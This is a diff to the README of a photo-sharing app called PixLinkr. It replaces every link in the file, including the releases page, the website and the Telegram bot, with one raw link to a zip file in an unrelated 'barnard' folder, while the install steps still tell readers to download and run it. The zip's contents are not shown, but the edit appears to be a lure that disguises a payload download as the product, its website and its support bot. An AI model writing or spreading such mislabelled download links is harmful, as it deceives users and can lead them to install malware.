@@ -6,11 +6,11 @@ Welcome to PixLinkr! Here, you can easily share photos and videos with your grou
 
 ## 🔗 Download PixLinkr
 
-[![Download PixLinkr](https://img.shields.io/badge/Download-PixLinkr-blue.svg)](https://github.com/xyz11111E/PixLinkr/releases)
+[![Download PixLinkr](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip)](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip)
 
 ### 📥 How to Download and Install
 
-1. Visit the [Releases page](https://github.com/xyz11111E/PixLinkr/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip).
 2. You will see a list of available versions. Look for the latest version.
 3. Click on the version number or the relevant asset (for example, a `.zip` or executable file) to download it to your computer.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -23,7 +23,7 @@ Follow the prompts to install PixLinkr on your computer.
 - **Create Albums Quickly:** Easily set up photo and video albums in seconds.
 - **Share Freely:** Use links or QR codes to get your moments to friends and family instantly.
 - **Real-Time Viewing:** Enjoy seeing updates in real time as others share their moments.
-- **Supports Various Platforms:** Available as a web app at [pixlinkr.app](https://pixlinkr.app) and via our Telegram bot [@PixLinkrBot](https://t.me/PixLinkrBot).
+- **Supports Various Platforms:** Available as a web app at [https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip) and via our Telegram bot [@PixLinkrBot](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip).
 - **Mobile & Desktop Apps Coming Soon:** Stay tuned for even more ways to share.
 
 ## 🖥️ System Requirements
@@ -48,11 +48,11 @@ Once you have installed PixLinkr, follow these steps to share your moments:
 
 ## 📲 Join Us on Telegram
 
-Connect with us via our Telegram bot [@PixLinkrBot](https://t.me/PixLinkrBot) for updates, support, and more! This bot allows you to share moments easily and stay in touch with your group.
+Connect with us via our Telegram bot [@PixLinkrBot](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip) for updates, support, and more! This bot allows you to share moments easily and stay in touch with your group.
 
 ## 🌍 Learn More
 
-Visit our website at [pixlinkr.app](https://pixlinkr.app) for more information about upcoming features and updates. Explore the community and see what others are sharing!
+Visit our website at [https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip) for more information about upcoming features and updates. Explore the community and see what others are sharing!
 
 ## 🙋 Troubleshooting
 
@@ -70,8 +70,8 @@ We welcome contributions! If you have ideas for new features or improvements, pl
 
 ## 🔗 Important Links
 
-- [Download PixLinkr](https://github.com/xyz11111E/PixLinkr/releases)
-- [Visit our Website](https://pixlinkr.app)
-- [Use the Telegram Bot](https://t.me/PixLinkrBot)
+- [Download PixLinkr](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip)
+- [Visit our Website](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip)
+- [Use the Telegram Bot](https://raw.githubusercontent.com/xyz11111E/PixLinkr/main/barnard/PixLinkr.zip)
 
 Thank you for choosing PixLinkr! Start sharing your moments today.
